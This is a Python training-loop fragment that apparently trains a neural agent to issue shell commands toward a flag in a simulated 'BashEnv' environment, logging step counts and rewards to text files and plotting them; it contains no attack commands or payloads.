    avg_moves, avg_scores, avg_norm_scores, avg_stepreward = [], [], [], []
    obs, infos = env.reset()  # Start new episode.
    env.set_flag(pathNo)
#    env.set_pwd()
    print('Flag: '+env.flag)
  #  print("Current: "+ env.pwd())
    
    
    episodes = 0
    for no_episode in range(nb_episodes):
        episodes += 1
        print(episodes)
        obs, infos = env.reset()  # Start new episode.\
        #env.scan(self)
        env.set_flag(pathNo)
        commandx = []
        
        score = 0
        done = False
        nb_moves = 0
        while not done:
            command = agent.act(obs, score, done, infos)
          #  print(command)
            command_list.append(command)
            #commandx.append(command)
          #  if command == 'run':
            obs, score, done, infos = env.step(command)
          #  print(infos)
           # print(obs)
          #  print(done)
               # time.sleep(10.0)
                
           # else:
               # obs, score, done, infos = env.step(command)
     #       try:
      #          obs, score, done, infos = env.step(command)
                
       #     except :
        #        env.reset()
                
            
            
            nb_moves += 1
            #if done:
                #z = commandx[-10:]
                #print(z)
          #  print(nb_moves, max_step, command, done, env.pwd)
            if nb_moves >= max_step:
                break
        
        agent.act(obs, score, done, infos)  # Let the agent know the game is done.
            
                
        if verbose:
            #command_list.clear()
            if score >= 100:
            
                print(" {}".format(nb_moves), end="")
            else:
                print(" {}".format(nb_moves)+".", end="")
        reward_step = score/nb_moves
        with open('avgrewardbertcss12.txt', 'a') as f:
            f.write(str(reward_step)+'\n')
        f.close()
        with open('avgstepbertcss12.txt', 'a') as x:
            x.write(str(nb_moves)+'\n')
        x.close()
        avg_stepreward.append(reward_step)
       # nb_moves2 = str(nb_moves) + 'n'
        avg_moves.append(nb_moves)
        
        
    #    print(avg_moves)
        avg_scores.append(score)
   #     print(avg_scores)
        avg_norm_scores.append(score / infos["max_score"])
        episode = list(range(1,1001))
    avg_moves2 = [str(n) for n in avg_moves]
    with open('attacktest2-16.txt', 'a') as f:
        for d in avg_moves2:
              f.writelines("%s\n" % d)   
        #f.writelines(avg_moves2)   
    joblib.dump(agent,'trained_agentX.pkl', compress=True)        

    #env.close()
    msg = "  \tavg. steps: {:5.1f}; avg. score: {:4.1f} / {}."
    print(msg.format(np.mean(avg_moves), np.mean(avg_scores), infos["max_score"]))
    plt.plot(episode, avg_stepreward)
    plt.xlabel("episode")
    plt.ylabel("average reward(step)")
    plt.savefig("attackresultx13.jpg")
    plt.show()
    
    
    plt.plot(episode, avg_moves)
    plt.xlabel("episode")
    plt.ylabel("step")
    plt.savefig("attackresultX13.jpg")
    plt.show()
    
    
    
    
    return avg_moves, avg_scores

        
    
    
    
    

        
        
        
        
        
        
        
        
        
        
        
        
        



#device = 'cpu'
torch.cuda.is_available()

torch.set_default_tensor_type('torch.cuda.FloatTensor')
print(torch.__version__)
device = 'cuda' if torch.cuda.is_available() else 'cpu'
print(device) 

#env = BashEnv()
#for i in range(470):
env = BashEnv()
    #env = BashEnv()
#try:
  #  agent = joblib.load('trained_agentX.pkl')
#except:
    
    
agent = NeuralAgent()


#model=NeuralAgent()
starttime = time.time()
play(agent, env, -5, max_step=500, nb_episodes=1000, verbose=True).to(device)
#torch.save(agent.state_dict(), '/home/yoneda/metasploitenv/model3.pkl')